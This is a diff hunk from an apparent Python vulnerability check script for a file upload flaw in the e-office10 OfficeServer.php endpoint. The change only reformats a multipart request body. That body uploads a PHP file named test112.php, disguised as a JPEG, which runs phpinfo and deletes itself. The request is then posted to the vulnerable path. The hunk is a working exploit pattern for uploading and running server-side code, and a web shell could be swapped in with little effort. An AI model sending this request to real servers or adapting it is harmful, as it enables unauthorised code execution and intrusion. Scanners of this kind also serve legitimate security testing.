@@ -15,16 +15,16 @@ def verify(url):
         'Connection': 'close',
     }
     data = '''
-        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
-        Content-Disposition: form-data; name="FileData"; filename="1.jpg"
-        Content-Type: image/jpeg
-         
-        <?php phpinfo();unlink(__FILE__);?>
-        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
-        Content-Disposition: form-data; name="FormData"
-         
-        {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test112.php'}
-        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
+------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+Content-Disposition: form-data; name="FileData"; filename="1.jpg"
+Content-Type: image/jpeg
+ 
+<?php phpinfo();unlink(__FILE__);?>
+------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+Content-Disposition: form-data; name="FormData"
+ 
+{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test112.php'}
+------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
     '''
     vurl = urllib.parse.urljoin(url, "/eoffice10/server/public/iWebOffice2015/OfficeServer.php")
     try:
